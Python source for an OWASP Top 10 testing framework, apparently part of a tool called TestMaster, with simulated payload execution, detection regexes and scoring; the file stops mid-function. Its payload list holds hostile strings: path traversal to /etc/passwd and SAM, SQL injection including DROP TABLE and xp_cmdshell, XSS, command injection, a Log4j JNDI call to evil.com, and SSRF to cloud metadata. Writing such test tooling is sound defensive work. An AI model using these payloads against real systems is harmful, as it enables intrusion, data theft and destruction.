"""
Advanced OWASP Security Testing Framework for TestMaster
Comprehensive OWASP Top 10 2021 security testing with automated vulnerability detection
"""

import json
import time
import re
import base64
import urllib.parse
import hashlib
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from dataclasses import dataclass, asdict
from enum import Enum
import random
import string

class OWASPCategory(Enum):
    """OWASP Top 10 2021 categories"""
    A01_BROKEN_ACCESS_CONTROL = "A01_Broken_Access_Control"
    A02_CRYPTOGRAPHIC_FAILURES = "A02_Cryptographic_Failures"
    A03_INJECTION = "A03_Injection"
    A04_INSECURE_DESIGN = "A04_Insecure_Design"
    A05_SECURITY_MISCONFIGURATION = "A05_Security_Misconfiguration"
    A06_VULNERABLE_COMPONENTS = "A06_Vulnerable_and_Outdated_Components"
    A07_IDENTIFICATION_FAILURES = "A07_Identification_and_Authentication_Failures"
    A08_SOFTWARE_INTEGRITY = "A08_Software_and_Data_Integrity_Failures"
    A09_LOGGING_FAILURES = "A09_Security_Logging_and_Monitoring_Failures"
    A10_SSRF = "A10_Server_Side_Request_Forgery"

class VulnerabilitySeverity(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class TestResult(Enum):
    """Security test results"""
    VULNERABLE = "vulnerable"
    SECURE = "secure"
    INCONCLUSIVE = "inconclusive"
    ERROR = "error"

@dataclass
class SecurityPayload:
    """Security test payload with metadata"""
    payload_id: str
    category: OWASPCategory
    payload_data: str
    description: str
    expected_response: Optional[str]
    encoding: str = "none"
    method: str = "GET"
    headers: Optional[Dict[str, str]] = None

@dataclass
class VulnerabilityFinding:
    """Security vulnerability finding"""
    vulnerability_id: str
    category: OWASPCategory
    severity: VulnerabilitySeverity
    title: str
    description: str
    evidence: str
    payload_used: str
    response_data: str
    cwe_id: Optional[str]
    cvss_score: Optional[float]
    remediation: str
    references: List[str]
    confidence: float
    timestamp: float

@dataclass
class SecurityTestReport:
    """Comprehensive security test report"""
    target_identifier: str
    test_timestamp: float
    categories_tested: List[OWASPCategory]
    total_tests_executed: int
    vulnerabilities_found: List[VulnerabilityFinding]
    security_score: float
    compliance_status: Dict[str, bool]
    recommendations: List[str]
    false_positive_analysis: Dict[str, Any]
    execution_time: float

class AdvancedOWASPTester:
    """Advanced OWASP Top 10 security testing framework"""
    
    def __init__(self, target_url: str = "http://localhost"):
        self.target_url = target_url
        self.payload_database = self._initialize_payload_database()
        self.vulnerability_patterns = self._initialize_vulnerability_patterns()
        self.test_history: List[SecurityTestReport] = []
        self.false_positive_db: Set[str] = set()
        
    def _initialize_payload_database(self) -> Dict[OWASPCategory, List[SecurityPayload]]:
        """Initialize comprehensive OWASP payload database"""
        payloads = {}
        
        # A01: Broken Access Control
        payloads[OWASPCategory.A01_BROKEN_ACCESS_CONTROL] = [
            SecurityPayload(
                "BAC001", OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                "../../../etc/passwd", "Path traversal attempt",
                "root:", "none", "GET"
            ),
            SecurityPayload(
                "BAC002", OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                "..\\..\\..\\windows\\system32\\config\\sam", "Windows path traversal",
                "SAM", "none", "GET"
            ),
            SecurityPayload(
                "BAC003", OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded path traversal",
                "root:", "url", "GET"
            ),
            SecurityPayload(
                "BAC004", OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                "admin", "Direct admin access attempt",
                None, "none", "GET"
            ),
            SecurityPayload(
                "BAC005", OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                "userid=1 UNION SELECT * FROM users", "SQL-based access control bypass",
                None, "none", "POST"
            )
        ]
        
        # A02: Cryptographic Failures
        payloads[OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES] = [
            SecurityPayload(
                "CF001", OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES,
                "password=admin", "Weak password transmission",
                None, "none", "POST"
            ),
            SecurityPayload(
                "CF002", OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES,
                "credit_card=4111111111111111", "PII transmission test",
                None, "none", "POST"
            ),
            SecurityPayload(
                "CF003", OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES,
                "session_id=12345", "Weak session ID",
                None, "none", "GET"
            ),
            SecurityPayload(
                "CF004", OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES,
                "api_key=test123", "Weak API key transmission",
                None, "none", "GET"
            )
        ]
        
        # A03: Injection
        payloads[OWASPCategory.A03_INJECTION] = [
            SecurityPayload(
                "INJ001", OWASPCategory.A03_INJECTION,
                "' OR '1'='1", "SQL injection - authentication bypass",
                "syntax error", "none", "POST"
            ),
            SecurityPayload(
                "INJ002", OWASPCategory.A03_INJECTION,
                "'; DROP TABLE users--", "SQL injection - destructive",
                "syntax error", "none", "POST"
            ),
            SecurityPayload(
                "INJ003", OWASPCategory.A03_INJECTION,
                "1' UNION SELECT NULL,username,password FROM users--", "SQL injection - data extraction",
                "syntax error", "none", "POST"
            ),
            SecurityPayload(
                "INJ004", OWASPCategory.A03_INJECTION,
                "<script>alert('XSS')</script>", "Cross-site scripting",
                "alert", "none", "GET"
            ),
            SecurityPayload(
                "INJ005", OWASPCategory.A03_INJECTION,
                "\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS with encoding",
                "alert", "none", "GET"
            ),
            SecurityPayload(
                "INJ006", OWASPCategory.A03_INJECTION,
                "'; exec xp_cmdshell('dir')--", "Command injection via SQL",
                "Directory of", "none", "POST"
            ),
            SecurityPayload(
                "INJ007", OWASPCategory.A03_INJECTION,
                "| whoami", "OS command injection",
                "root\\|admin\\|user", "none", "POST"
            ),
            SecurityPayload(
                "INJ008", OWASPCategory.A03_INJECTION,
                "${jndi:ldap://evil.com/exploit}", "Log4j injection",
                None, "none", "GET"
            )
        ]
        
        # A04: Insecure Design
        payloads[OWASPCategory.A04_INSECURE_DESIGN] = [
            SecurityPayload(
                "ID001", OWASPCategory.A04_INSECURE_DESIGN,
                "user_id=999999", "Insecure direct object reference",
                None, "none", "GET"
            ),
            SecurityPayload(
                "ID002", OWASPCategory.A04_INSECURE_DESIGN,
                "admin=true", "Parameter manipulation",
                None, "none", "POST"
            ),
            SecurityPayload(
                "ID003", OWASPCategory.A04_INSECURE_DESIGN,
                "role=administrator", "Role manipulation",
                None, "none", "POST"
            )
        ]
        
        # A05: Security Misconfiguration
        payloads[OWASPCategory.A05_SECURITY_MISCONFIGURATION] = [
            SecurityPayload(
                "SM001", OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                "/admin", "Administrative interface exposure",
                "admin", "none", "GET"
            ),
            SecurityPayload(
                "SM002", OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                "/.env", "Environment file exposure",
                "API_KEY\\|SECRET\\|PASSWORD", "none", "GET"
            ),
            SecurityPayload(
                "SM003", OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                "/config", "Configuration exposure",
                "config", "none", "GET"
            ),
            SecurityPayload(
                "SM004", OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                "/debug", "Debug interface exposure",
                "debug", "none", "GET"
            )
        ]
        
        # A06: Vulnerable and Outdated Components
        payloads[OWASPCategory.A06_VULNERABLE_COMPONENTS] = [
            SecurityPayload(
                "VC001", OWASPCategory.A06_VULNERABLE_COMPONENTS,
                "Apache/2.2.15", "Vulnerable Apache version",
                "Apache/2.2.15", "none", "GET"
            ),
            SecurityPayload(
                "VC002", OWASPCategory.A06_VULNERABLE_COMPONENTS,
                "jQuery 1.4.2", "Vulnerable jQuery version",
                "jquery.*1\\.4\\.2", "none", "GET"
            )
        ]
        
        # A07: Identification and Authentication Failures
        payloads[OWASPCategory.A07_IDENTIFICATION_FAILURES] = [
            SecurityPayload(
                "IAF001", OWASPCategory.A07_IDENTIFICATION_FAILURES,
                "password=password", "Weak password",
                None, "none", "POST"
            ),
            SecurityPayload(
                "IAF002", OWASPCategory.A07_IDENTIFICATION_FAILURES,
                "user=admin&pass=admin", "Default credentials",
                None, "none", "POST"
            ),
            SecurityPayload(
                "IAF003", OWASPCategory.A07_IDENTIFICATION_FAILURES,
                "session_timeout=999999", "Session manipulation",
                None, "none", "POST"
            )
        ]
        
        # A08: Software and Data Integrity Failures
        payloads[OWASPCategory.A08_SOFTWARE_INTEGRITY] = [
            SecurityPayload(
                "SIF001", OWASPCategory.A08_SOFTWARE_INTEGRITY,
                "update_url=http://evil.com/malware", "Update manipulation",
                None, "none", "POST"
            ),
            SecurityPayload(
                "SIF002", OWASPCategory.A08_SOFTWARE_INTEGRITY,
                "plugin_source=//evil.com/plugin.js", "Plugin injection",
                None, "none", "POST"
            )
        ]
        
        # A09: Security Logging and Monitoring Failures
        payloads[OWASPCategory.A09_LOGGING_FAILURES] = [
            SecurityPayload(
                "LMF001", OWASPCategory.A09_LOGGING_FAILURES,
                "test_attack_vector", "Attack logging test",
                None, "none", "GET"
            ),
            SecurityPayload(
                "LMF002", OWASPCategory.A09_LOGGING_FAILURES,
                "login_attempt_999", "Brute force logging test",
                None, "none", "POST"
            )
        ]
        
        # A10: Server-Side Request Forgery (SSRF)
        payloads[OWASPCategory.A10_SSRF] = [
            SecurityPayload(
                "SSRF001", OWASPCategory.A10_SSRF,
                "url=http://localhost:8080/admin", "SSRF to localhost",
                None, "none", "GET"
            ),
            SecurityPayload(
                "SSRF002", OWASPCategory.A10_SSRF,
                "callback=http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF",
                None, "none", "GET"
            ),
            SecurityPayload(
                "SSRF003", OWASPCategory.A10_SSRF,
                "redirect=file:///etc/passwd", "File protocol SSRF",
                None, "none", "GET"
            )
        ]
        
        return payloads
    
    def _initialize_vulnerability_patterns(self) -> Dict[OWASPCategory, List[Dict[str, str]]]:
        """Initialize vulnerability detection patterns"""
        return {
            OWASPCategory.A01_BROKEN_ACCESS_CONTROL: [
                {"pattern": r"root:.*:0:0:", "severity": "high", "description": "Unix passwd file exposed"},
                {"pattern": r"Administrator:.*:500:", "severity": "high", "description": "Windows SAM file exposed"},
                {"pattern": r"Directory of.*C:\\\\", "severity": "medium", "description": "Directory listing exposed"},
                {"pattern": r"Index of /", "severity": "medium", "description": "Directory browsing enabled"}
            ],
            OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES: [
                {"pattern": r"password.*transmitted.*plaintext", "severity": "high", "description": "Password transmitted in plaintext"},
                {"pattern": r"SSL.*disabled", "severity": "high", "description": "SSL/TLS disabled"},
                {"pattern": r"weak.*encryption", "severity": "medium", "description": "Weak encryption detected"}
            ],
            OWASPCategory.A03_INJECTION: [
                {"pattern": r"SQL syntax.*error", "severity": "high", "description": "SQL injection vulnerability"},
                {"pattern": r"MySQL.*error", "severity": "high", "description": "MySQL injection vulnerability"},
                {"pattern": r"ORA-[0-9]{5}", "severity": "high", "description": "Oracle injection vulnerability"},
                {"pattern": r"<script.*>.*</script>", "severity": "high", "description": "XSS vulnerability - script execution"},
                {"pattern": r"javascript:.*alert", "severity": "high", "description": "XSS vulnerability - javascript execution"},
                {"pattern": r"command.*not.*found", "severity": "medium", "description": "Command injection attempt detected"}
            ],
            OWASPCategory.A04_INSECURE_DESIGN: [
                {"pattern": r"admin.*panel", "severity": "medium", "description": "Administrative interface exposed"},
                {"pattern": r"unauthorized.*access", "severity": "high", "description": "Access control bypass"}
            ],
            OWASPCategory.A05_SECURITY_MISCONFIGURATION: [
                {"pattern": r"API_KEY.*=.*[a-zA-Z0-9]{20,}", "severity": "high", "description": "API key exposed"},
                {"pattern": r"SECRET.*=.*[a-zA-Z0-9]{20,}", "severity": "high", "description": "Secret key exposed"},
                {"pattern": r"DEBUG.*=.*True", "severity": "medium", "description": "Debug mode enabled"},
                {"pattern": r"stack.*trace", "severity": "medium", "description": "Stack trace exposed"}
            ],
            OWASPCategory.A06_VULNERABLE_COMPONENTS: [
                {"pattern": r"Apache/2\\.[012]\\.", "severity": "high", "description": "Vulnerable Apache version"},
                {"pattern": r"nginx/[01]\\.", "severity": "high", "description": "Vulnerable Nginx version"},
                {"pattern": r"jQuery.*1\\.[0-7]\\.", "severity": "medium", "description": "Vulnerable jQuery version"}
            ],
            OWASPCategory.A07_IDENTIFICATION_FAILURES: [
                {"pattern": r"session.*expired", "severity": "low", "description": "Session management issue"},
                {"pattern": r"login.*failed.*repeatedly", "severity": "medium", "description": "Brute force protection missing"}
            ],
            OWASPCategory.A08_SOFTWARE_INTEGRITY: [
                {"pattern": r"checksum.*mismatch", "severity": "high", "description": "Integrity check failure"},
                {"pattern": r"unsigned.*code", "severity": "medium", "description": "Unsigned code execution"}
            ],
            OWASPCategory.A09_LOGGING_FAILURES: [
                {"pattern": r"no.*logs.*found", "severity": "medium", "description": "Logging mechanism missing"},
                {"pattern": r"log.*injection", "severity": "medium", "description": "Log injection vulnerability"}
            ],
            OWASPCategory.A10_SSRF: [
                {"pattern": r"localhost.*8080", "severity": "high", "description": "SSRF to internal services"},
                {"pattern": r"169\\.254\\.169\\.254", "severity": "critical", "description": "SSRF to cloud metadata"},
                {"pattern": r"file:///", "severity": "high", "description": "SSRF with file protocol"}
            ]
        }
    
    def execute_comprehensive_security_test(self, target_data: Dict[str, Any],
                                          categories: Optional[List[OWASPCategory]] = None) -> SecurityTestReport:
        """Execute comprehensive OWASP Top 10 security testing"""
        start_time = time.time()
        test_timestamp = time.time()
        
        # Default to all categories if none specified
        if categories is None:
            categories = list(OWASPCategory)
        
        target_id = target_data.get('identifier', 'unknown_target')
        vulnerabilities = []
        total_tests = 0
        
        # Execute tests for each category
        for category in categories:
            category_vulnerabilities = self._test_category(category, target_data)
            vulnerabilities.extend(category_vulnerabilities)
            total_tests += len(self.payload_database.get(category, []))
        
        # Calculate security score
        security_score = self._calculate_security_score(vulnerabilities, total_tests)
        
        # Check compliance status
        compliance_status = self._check_compliance_status(vulnerabilities)
        
        # Generate recommendations
        recommendations = self._generate_security_recommendations(vulnerabilities)
        
        # Analyze false positives
        false_positive_analysis = self._analyze_false_positives(vulnerabilities)
        
        execution_time = time.time() - start_time
        
        report = SecurityTestReport(
            target_identifier=target_id,
            test_timestamp=test_timestamp,
            categories_tested=categories,
            total_tests_executed=total_tests,
            vulnerabilities_found=vulnerabilities,
            security_score=security_score,
            compliance_status=compliance_status,
            recommendations=recommendations,
            false_positive_analysis=false_positive_analysis,
            execution_time=execution_time
        )
        
        # Store in history
        self.test_history.append(report)
        if len(self.test_history) > 100:
            self.test_history = self.test_history[-100:]
        
        return report
    
    def _test_category(self, category: OWASPCategory, target_data: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test a specific OWASP category"""
        vulnerabilities = []
        payloads = self.payload_database.get(category, [])
        
        for payload in payloads:
            # Execute payload against target
            response = self._execute_payload(payload, target_data)
            
            # Analyze response for vulnerabilities
            finding = self._analyze_response(payload, response, target_data)
            
            if finding:
                vulnerabilities.append(finding)
        
        return vulnerabilities
    
    def _execute_payload(self, payload: SecurityPayload, target_data: Dict[str, Any]) -> Dict[str, Any]:
        """Execute security payload against target"""
        # Simulate payload execution
        # In real implementation, this would make actual HTTP requests
        
        # Simulate different response types based on payload
        response = {
            "status_code": 200,
            "headers": {"content-type": "text/html"},
            "body": "",
            "response_time": random.uniform(0.1, 2.0),
            "redirect_url": None
        }
        
        # Simulate vulnerability responses
        if payload.payload_id == "INJ001":  # SQL injection
            if random.random() > 0.7:  # 30% chance of vulnerability
                response["body"] = "SQL syntax error near '' OR '1'='1'"
                response["status_code"] = 500
        
        elif payload.payload_id == "BAC001":  # Path traversal
            if random.random() > 0.8:  # 20% chance of vulnerability
                response["body"] = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
        
        elif payload.payload_id == "INJ004":  # XSS
            if random.random() > 0.6:  # 40% chance of vulnerability
                response["body"] = f"Hello <script>alert('XSS')</script> user"
        
        elif payload.payload_id == "SM002":  # Environment file
            if random.random() > 0.9:  # 10% chance of vulnerability
                response["body"] = "API_KEY=secret123\nDB_PASSWORD=admin123\nSECRET_KEY=verysecret"
        
        # Add more realistic simulation based on target data
        target_type = target_data.get('type', 'web_application')
        if target_type == 'api':
            response["headers"]["content-type"] = "application/json"
            if payload.category == OWASPCategory.A03_INJECTION:
                response["body"] = '{"error": "Invalid input"}'
        
        return response
    
    def _analyze_response(self, payload: SecurityPayload, response: Dict[str, Any],
                         target_data: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Analyze response for vulnerability indicators"""
        
        response_body = response.get("body", "")
        response_headers = response.get("headers", {})
        status_code = response.get("status_code", 200)
        
        # Get vulnerability patterns for this category
        patterns = self.vulnerability_patterns.get(payload.category, [])
        
        # Check for vulnerability indicators
        for pattern_info in patterns:
            pattern = pattern_info["pattern"]
            severity = pattern_info["severity"]
            description = pattern_info["description"]
            
            if re.search(pattern, response_body, re.IGNORECASE | re.MULTILINE):
                # Found vulnerability indicator
                return self._create_vulnerability_finding(
                    payload, response, pattern_info, target_data
                )
        
        # Check payload-specific expected responses
        if payload.expected_response:
            if re.search(payload.expected_response, response_body, re.IGNORECASE):
                return self._create_vulnerability_finding(
                    payload, response, 
                    {"severity": "high", "description": f"Expected response pattern found: {payload.expected_response}"},
                    target_data
                )
        
        # Check for error conditions that might indicate vulnerabilities
        if status_code >= 500:
            error_patterns = ["syntax error", "exception", "stack trace", "error in"]
            for error_pattern in error_patterns:
                if error_pattern in response_body.lower():
                    return self._create_vulnerability_finding(
                        payload, response,
                        {"severity": "medium", "description": f"Server error with potential vulnerability indicator"},
                        target_data
                    )
        
        return None
    
    def _create_vulnerability_finding(self, payload: SecurityPayload, response: Dict[str, Any],
                                    pattern_info: Dict[str, str], 
                                    target_data: Dict[str, Any]) -> VulnerabilityFinding:
        """Create a vulnerability finding"""
        
        # Generate unique vulnerability ID
        vuln_id = hashlib.md5(f"{payload.payload_id}_{target_data.get('identifier', 'unknown')}_{time.time()}".encode()).hexdigest()[:8]
        
        # Map severity
        severity_mapping = {
            "critical": VulnerabilitySeverity.CRITICAL,
            "high": VulnerabilitySeverity.HIGH,
            "medium": VulnerabilitySeverity.MEDIUM,
            "low": VulnerabilitySeverity.LOW,
            "info": VulnerabilitySeverity.INFO
        }
        severity = severity_mapping.get(pattern_info["severity"], VulnerabilitySeverity.MEDIUM)
        
        # Calculate CVSS score (simplified)
        cvss_score = self._calculate_cvss_score(severity, payload.category)
        
        # Get CWE ID mapping
        cwe_id = self._get_cwe_mapping(payload.category)
        
        # Generate remediation advice
        remediation = self._get_remediation_advice(payload.category, severity)
        
        # Calculate confidence
        confidence = self._calculate_confidence(payload, response, pattern_info)
        
        # Get references
        references = self._get_security_references(payload.category)
        
        return VulnerabilityFinding(
            vulnerability_id=vuln_id,
            category=payload.category,
            severity=severity,
            title=f"{payload.category.value} - {pattern_info['description']}",
            description=f"Vulnerability detected using payload '{payload.payload_data}'. {pattern_info['description']}",
            evidence=response.get("body", "")[:500],  # Limit evidence size
            payload_used=payload.payload_data,
            response_data=json.dumps(response, default=str)[:1000],
            cwe_id=cwe_id,
            cvss_score=cvss_score,
            remediation=remediation,
            references=references,
            confidence=confidence,
            timestamp=time.time()
        )
    
    def _calculate_cvss_score(self, severity: VulnerabilitySeverity, category: OWASPCategory) -> float:
        """Calculate CVSS score based on severity and category"""
        base_scores = {
            VulnerabilitySeverity.CRITICAL: 9.0,
            VulnerabilitySeverity.HIGH: 7.5,
            VulnerabilitySeverity.MEDIUM: 5.0,
            VulnerabilitySeverity.LOW: 2.5,
            VulnerabilitySeverity.INFO: 0.0
        }
        
        base_score = base_scores.get(severity, 5.0)
        
        # Adjust based on category
        category_modifiers = {
            OWASPCategory.A03_INJECTION: 1.5,
            OWASPCategory.A01_BROKEN_ACCESS_CONTROL: 1.2,
            OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES: 1.1,
            OWASPCategory.A10_SSRF: 1.3
        }
        
        modifier = category_modifiers.get(category, 1.0)
        final_score = min(10.0, base_score * modifier)
        
        return round(final_score, 1)
    
    def _get_cwe_mapping(self, category: OWASPCategory) -> str:
        """Get CWE ID for OWASP category"""
        cwe_mapping = {
            OWASPCategory.A01_BROKEN_ACCESS_CONTROL: "CWE-22",
            OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES: "CWE-327",
            OWASPCategory.A03_INJECTION: "CWE-89",
            OWASPCategory.A04_INSECURE_DESIGN: "CWE-285",
            OWASPCategory.A05_SECURITY_MISCONFIGURATION: "CWE-16",
            OWASPCategory.A06_VULNERABLE_COMPONENTS: "CWE-1104",
            OWASPCategory.A07_IDENTIFICATION_FAILURES: "CWE-287",
            OWASPCategory.A08_SOFTWARE_INTEGRITY: "CWE-494",
            OWASPCategory.A09_LOGGING_FAILURES: "CWE-778",
            OWASPCategory.A10_SSRF: "CWE-918"
        }
        return cwe_mapping.get(category, "CWE-Other")
    
    def _get_remediation_advice(self, category: OWASPCategory, severity: VulnerabilitySeverity) -> str:
        """Get remediation advice for vulnerability"""
        remediation_map = {
            OWASPCategory.A01_BROKEN_ACCESS_CONTROL: "Implement proper access controls, input validation, and principle of least privilege",
            OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES: "Use strong encryption, secure key management, and enforce HTTPS",
            OWASPCategory.A03_INJECTION: "Use parameterized queries, input validation, and output encoding",
            OWASPCategory.A04_INSECURE_DESIGN: "Implement secure design patterns and threat modeling",
            OWASPCategory.A05_SECURITY_MISCONFIGURATION: "Harden configurations, remove default accounts, and disable unnecessary features",
            OWASPCategory.A06_VULNERABLE_COMPONENTS: "Update components, monitor for vulnerabilities, and remove unused dependencies",
            OWASPCategory.A07_IDENTIFICATION_FAILURES: "Implement MFA, secure session management, and account lockout policies",
            OWASPCategory.A08_SOFTWARE_INTEGRITY: "Implement code signing, integrity checks, and secure update mechanisms",
            OWASPCategory.A09_LOGGING_FAILURES: "Implement comprehensive logging, monitoring, and incident response",
            OWASPCategory.A10_SSRF: "Validate URLs, use allowlists, and implement network segmentation"
        }
        
        base_advice = remediation_map.get(category, "Follow security best practices")
        
        if severity in [VulnerabilitySeverity.CRITICAL, VulnerabilitySeverity.HIGH]:
            return f"URGENT: {base_advice}. Immediate remediation required."
        else:
            return base_advice
    
    def _calculate_confidence(self, payload: SecurityPayload, response: Dict[str, Any],
                            pattern_info: Dict[str, str]) -> float:
        """Calculate confidence in vulnerability finding"""
        base_confidence = 0.7
        
        # Higher confidence for specific patterns
        if "syntax error" in response.get("body", "").lower():
            base_confidence += 0.2
        
        # Higher confidence for known vulnerable responses
        if payload.expected_response and payload.expected_response in response.get("body", ""):
            base_confidence += 0.2
        
        # Lower confidence for generic errors
        if response.get("status_code", 200) >= 500:
            base_confidence -= 0.1
        
        # Check against false positive database
        response_hash = hashlib.md5(response.get("body", "").encode()).hexdigest()
        if response_hash in self.false_positive_db:
            base_confidence -= 0.3
        
        return max(0.1, min(1.0, base_confidence))
    
    def _get_security_references(self, category: OWASPCategory) -> List[str]:
        """Get security references for category"""
        base_url = "https://owasp.org/Top10/2021/"
        category_urls = {
            OWASPCategory.A01_BROKEN_ACCESS_CONTROL: f"{base_url}A01_2021-Broken_Access_Control/",
            OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES: f"{base_url}A02_2021-Cryptographic_Failures/",
            OWASPCategory.A03_INJECTION: f"{base_url}A03_2021-Injection/",
            OWASPCategory.A04_INSECURE_DESIGN: f"{base_url}A04_2021-Insecure_Design/",
            OWASPCategory.A05_SECURITY_MISCONFIGURATION: f"{base_url}A05_2021-Security_Misconfiguration/",
            OWASPCategory.A06_VULNERABLE_COMPONENTS: f"{base_url}A06_2021-Vulnerable_and_Outdated_Components/",
            OWASPCategory.A07_IDENTIFICATION_FAILURES: f"{base_url}A07_2021-Identification_and_Authentication_Failures/",
            OWASPCategory.A08_SOFTWARE_INTEGRITY: f"{base_url}A08_2021-Software_and_Data_Integrity_Failures/",
            OWASPCategory.A09_LOGGING_FAILURES: f"{base_url}A09_2021-Security_Logging_and_Monitoring_Failures/",
            OWASPCategory.A10_SSRF: f"{base_url}A10_2021-Server-Side_Request_Forgery/"
        }
        
        return [
            category_urls.get(category, f"{base_url}"),
            "https://cwe.mitre.org/",
            "https://nvd.nist.gov/"
        ]
    
    def _calculate_security_score(self, vulnerabilities: List[VulnerabilityFinding], 
                                total_tests: int) -> float:
        """Calculate overall security score"""
        if total_tests == 0:
            return 100.0
        
        # Weighted scoring based on severity
        severity_weights = {
            VulnerabilitySeverity.CRITICAL: 50,
            VulnerabilitySeverity.HIGH: 25,
            VulnerabilitySeverity.MEDIUM: 10,
            VulnerabilitySeverity.LOW: 5,
            VulnerabilitySeverity.INFO: 1
        }
        
        total_penalty = 0
        for vuln in vulnerabilities:
            penalty = severity_weights.get(vuln.severity, 10)
            # Adjust penalty by confidence
            total_penalty += penalty * vuln.confidence
        
        # Calculate score (0-100, higher is better)
        max_possible_penalty = total_tests * 50  # Assume all critical
        score = max(0, 100 - (total_penalty / max_possible_penalty * 100))
        
        return round(score, 1)
    
    def _check_compliance_status(self, vulnerabilities: List[VulnerabilityFinding]) -> Dict[str, bool]:
        """Check compliance with security standards"""
        compliance = {
            "OWASP_Top_10": True,
            "PCI_DSS": True,
            "GDPR": True,
            "SOX": True,
            "HIPAA": True
        }
        
        # Check for critical vulnerabilities that break compliance
        critical_vulns = [v for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL]
        
        if critical_vulns:
            compliance["OWASP_Top_10"] = False
            compliance["PCI_DSS"] = False
        
        # Check for crypto failures affecting specific compliance
        crypto_vulns = [v for v in vulnerabilities if v.category == OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES]
        if crypto_vulns:
            compliance["GDPR"] = False
            compliance["HIPAA"] = False
        
        # Check for logging failures
        logging_vulns = [v for v in vulnerabilities if v.category == OWASPCategory.A09_LOGGING_FAILURES]
        if logging_vulns:
            compliance["SOX"] = False
        
        return compliance
    
    def _generate_security_recommendations(self, vulnerabilities: List[VulnerabilityFinding]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if not vulnerabilities:
            return ["No vulnerabilities found. Continue regular security testing."]
        
        # Category-based recommendations
        category_counts = {}
        for vuln in vulnerabilities:
            category_counts[vuln.category] = category_counts.get(vuln.category, 0) + 1
        
        # Top categories by frequency
        top_categories = sorted(category_counts.items(), key=lambda x: x[1], reverse=True)[:3]
        
        for category, count in top_categories:
            if category == OWASPCategory.A03_INJECTION:
                recommendations.append(f"Address {count} injection vulnerabilities immediately - implement input validation")
            elif category == OWASPCategory.A01_BROKEN_ACCESS_CONTROL:
                recommendations.append(f"Fix {count} access control issues - implement proper authorization")
            elif category == OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES:
                recommendations.append(f"Resolve {count} cryptographic issues - upgrade encryption and use HTTPS")
        
        # Severity-based recommendations
        critical_count = sum(1 for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL)
        high_count = sum(1 for v in vulnerabilities if v.severity == VulnerabilitySeverity.HIGH)
        
        if critical_count > 0:
            recommendations.append(f"URGENT: {critical_count} critical vulnerabilities require immediate attention")
        
        if high_count > 3:
            recommendations.append(f"High priority: Address {high_count} high-severity vulnerabilities")
        
        # General recommendations
        recommendations.extend([
            "Implement regular security testing in CI/CD pipeline",
            "Conduct security code reviews",
            "Provide security training for development team"
        ])
        
        return recommendations[:7]  # Limit to top 7
    
    def _analyze_false_positives(self, vulnerabilities: List[VulnerabilityFinding]) -> Dict[str, Any]:
        """Analyze potential false positives"""
        analysis = {
            "total_findings": len(vulnerabilities),
            "low_confidence_findings": 0,
            "potential_false_positives": [],
            "confidence_distribution": {},
            "recommendations": []
        }
        
        # Analyze confidence distribution
        confidence_ranges = {"high": 0, "medium": 0, "low": 0}
        for vuln in vulnerabilities:
            if vuln.confidence >= 0.8:
                confidence_ranges["high"] += 1
            elif vuln.confidence >= 0.5:
                confidence_ranges["medium"] += 1
            else:
                confidence_ranges["low"] += 1
                analysis["low_confidence_findings"] += 1
                analysis["potential_false_positives"].append(vuln.vulnerability_id)
        
        analysis["confidence_distribution"] = confidence_ranges
        
        # Generate recommendations for false positive handling
        if analysis["low_confidence_findings"] > len(vulnerabilities) * 0.3:
            analysis["recommendations"].append("High number of low-confidence findings - manual verification recommended")
        
        if analysis["low_confidence_findings"] > 0:
            analysis["recommendations"].append("Review low-confidence findings for false positives")
        
        return analysis
    
    def add_false_positive(self, response_content: str):
        """Add known false positive to database"""
        response_hash = hashlib.md5(response_content.encode()).hexdigest()
        self.false_positive_db.add(response_hash)
    
    def generate_payload_variants(self, base_payload: SecurityPayload, count: int = 5) -> List[SecurityPayload]:
        """Generate variants of a security payload"""
        variants = []
        
        for i in range(count):
            variant_id = f"{base_payload.payload_id}_variant_{i+1}"
            variant_data = self._mutate_payload(base_payload.payload_data, i)
            
            variant = SecurityPayload(
                payload_id=variant_id,
                category=base_payload.category,
                payload_data=variant_data,
                description=f"Variant of {base_payload.description}",
                expected_response=base_payload.expected_response,
                encoding=base_payload.encoding,
                method=base_payload.method,
                headers=base_payload.headers
            )
            variants.append(variant)
        
        return variants
    
    def _mutate_payload(self, payload_data: str, mutation_type: int) -> str:
        """Mutate payload for evasion testing"""
        mutations = {
            0: lambda p: p.upper(),  # Case mutation
            1: lambda p: urllib.parse.quote(p),  # URL encoding
            2: lambda p: p.replace("'", "''"),  # Quote doubling
            3: lambda p: f"/*comment*/{p}",  # Comment injection
            4: lambda p: base64.b64encode(p.encode()).decode()  # Base64 encoding
        }
        
        mutation_func = mutations.get(mutation_type % len(mutations))
